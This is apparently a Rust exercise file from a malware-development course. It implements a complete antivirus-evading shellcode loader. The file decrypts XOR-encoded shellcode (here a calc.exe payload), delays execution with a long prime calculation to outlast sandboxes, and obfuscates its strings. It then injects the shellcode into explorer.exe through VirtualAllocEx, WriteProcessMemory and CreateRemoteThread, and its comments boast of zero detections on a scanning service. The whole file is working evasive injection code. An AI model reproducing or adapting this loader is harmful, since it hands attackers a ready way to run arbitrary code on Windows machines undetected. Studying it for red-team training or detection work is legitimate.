// While there is a lot more evasion to do here, this example gets 0/26 on Antiscan.me at the time of writing

// We are using the obfstr crate, which introduces a macro to obfuscate strings at compile time
// Try running strings on the compiled artefact and finding our suspicious strings from below!
use obfstr::obfstr;

// Other imports are the same as Exercise 2
use std::ptr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::{
    Foundation::*,
    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
};

// Helper function to calculate primes used for sandbox evasion
#[no_mangle]
#[inline(never)] // Tell the compiler not to optimize our function :)
fn calc_primes(iterations: i32) {
    let mut prime = 2;
    let mut i = 0;
    while i < iterations {
        if (2..prime).all(|j| prime % j != 0) {
            i += 1;
        }
        prime += 1;
    }
}

// Same helper function as in 'encrypt.rs'
fn xor_array(array: &mut [u8], key: u8) -> () {
    for byte in array {
        *byte ^= key;
    }
}

// Same injection function as in Exercise 2, refer there if anything is unclear
// OPSEC tweaks have been added as comments
fn inject_remote(shellcode: &[u8], process_id: u32) {
    unsafe {
        let p_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
        // We use the 'obfstr!' macro to obfuscate strings here
        // Because 'println!' expects a string literal, we need to use format strings instead
        println!(
            "{} {:?}",
            obfstr!("[+] Got target process handle:"),
            p_handle
        );

        let r_ptr = VirtualAllocEx(
            p_handle,
            ptr::null(),
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        println!(
            "{} {:?}",
            obfstr!("[+] Allocated RWX memory in remote process at address"),
            r_ptr
        );

        let mut bytes_written = 0;
        WriteProcessMemory(
            p_handle,
            r_ptr,
            shellcode.as_ptr() as _,
            shellcode.len(),
            &mut bytes_written,
        );
        println!(
            "{} {} {}",
            obfstr!("[+] Wrote"),
            bytes_written,
            obfstr!("bytes to remote process memory!")
        );

        let t_handle = CreateRemoteThread(
            p_handle,
            ptr::null(),
            0,
            Some(std::mem::transmute(r_ptr)),
            ptr::null(),
            0,
            ptr::null_mut(),
        );
        println!("{}", obfstr!("[+] Created remote thread!"));

        CloseHandle(t_handle);
        CloseHandle(p_handle);
    }
}

fn main() {
    // Define our ENCRYPTED shellcode here
    // Output taken from 'encrypt.rs'
    let mut shellcode: [u8; 296] = [
        0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
        0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
        0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe,
        0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76,
        0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f,
        0x36, 0xe7, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36,
        0xe7, 0x67, 0xbc, 0x7f, 0x2f, 0x73, 0xbc, 0x77, 0x17, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f,
        0xc8, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7,
        0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b,
        0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7,
        0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33,
        0xbf, 0x7f, 0x36, 0xe7, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e,
        0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f,
        0xbc, 0x25, 0xde, 0x60, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x8d, 0x36, 0x37, 0x37, 0x37, 0x37,
        0x37, 0x37, 0x37, 0x7f, 0xba, 0xba, 0x36, 0x36, 0x37, 0x37, 0x76, 0x8d, 0x06, 0xbc, 0x58,
        0xb0, 0xc8, 0xe2, 0x8c, 0xd7, 0x2a, 0x1d, 0x3d, 0x76, 0x8d, 0x91, 0xa2, 0x8a, 0xaa, 0xc8,
        0xe2, 0x7f, 0xb4, 0xf3, 0x1f, 0x0b, 0x31, 0x4b, 0x3d, 0xb7, 0xcc, 0xd7, 0x42, 0x32, 0x8c,
        0x70, 0x24, 0x45, 0x58, 0x5d, 0x37, 0x6e, 0x76, 0xbe, 0xed, 0xc8, 0xe2, 0x74, 0x0d, 0x6b,
        0x40, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x44, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04,
        0x05, 0x6b, 0x54, 0x56, 0x5b, 0x54, 0x19, 0x52, 0x4f, 0x52, 0x37,
    ];

    // Perform prime calculations until a very high number is reached
    // This will take a while, hopefully timing out any sandboxes inspecting us
    // (This was not needed to reduce static detections in testing, but is good practice against basic dynamic analysis)
    calc_primes(25000); // about 30 seconds or more on, depending on CPU and build type (debug vs release)

    // Find the "explorer.exe" as in Exercise 2
    let s = System::new_all();
    let process_id: u32 = s
        .processes_by_name(obfstr!("explorer"))
        .next()
        .unwrap()
        .pid()
        .as_u32();

    println!(
        "{} {}",
        obfstr!("[+] Found explorer.exe with PID"),
        process_id
    );

    // Decode our shellcode in-place
    xor_array(&mut shellcode, 0x37);

    // Call our shellcode
    inject_remote(&shellcode, process_id);
}
